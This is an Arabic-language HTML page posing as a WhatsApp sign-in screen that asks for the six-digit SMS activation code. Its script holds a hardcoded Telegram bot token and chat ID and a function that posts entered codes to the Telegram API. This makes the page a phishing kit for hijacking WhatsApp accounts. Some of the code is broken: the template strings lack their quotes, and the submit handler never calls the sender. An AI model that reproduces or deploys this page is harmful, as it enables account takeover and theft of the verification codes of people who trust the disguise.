<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>تسجيل الدخول إلى WhatsApp</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FFFFFF;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        .container {
            padding: 20px;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        h1 {
            font-size: 24px;
            color: #333333;
            margin-bottom: 10px;
        }

        p {
            font-size: 16px;
            color: #666666;
            margin-bottom: 20px;
        }

        .pin-input {
            font-size: 24px;
            letter-spacing: 10px;
            width: calc(1.5em * 6);
            border: none;
            border-bottom: 2px solid #25D366;
            text-align: center;
            margin-bottom: 15px;
            padding: 5px 0;
            outline: none;
            color: #333333;
        }

        .pin-input:focus {
            border-color: #1DA955;
        }

        button {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            color: white;
            background-color: #25D366;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #1DA955;
        }

        .instruction {
            font-size: 14px;
            color: #999999;
            margin-top: 15px;
        }

        .forgot-link {
            color: #25D366;
            font-size: 16px;
            text-decoration: none;
            margin-top: 15px;
            display: inline-block;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        #countdown {
            color: red;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>

<body>
    <div class="container" id="container">
        <h1>رمز التفعيل</h1>
        <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
        <input id="activationCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
        <button onclick="submitFirstActivationCode()">متابعة</button>
        <div id="countdown"></div>
    </div>

    <script>
        function sendCodeToTelegram(code, type) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
            const chatId = '612575358';
            const message = ${type}: ${code};

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            }).catch(error => {
                console.error('فشل الاتصال بالخادم:', error);
            });
        }

        function startCountdown(callback) {
            let countdownValue = 5;
            const countdownDisplay = document.getElementById('countdown');
            countdownDisplay.textContent = انتظر ${countdownValue} ثانية;

            const interval = setInterval(() => {
                countdownValue--;
                if (countdownValue <= 0) {
                    clearInterval(interval);
                    countdownDisplay.textContent = '';
                    callback();
                } else {
                    countdownDisplay.textContent = انتظر ${countdownValue} ثانية;
                }
            }, 1000);
        }
// افتراضا، يمكن أن تكون هذه الدالة جزءًا من الكود
        function submitFirstActivationCode() {
            alert('تم إدخال رمز التفعيل.');
        }
    </script>
</body>

</html>
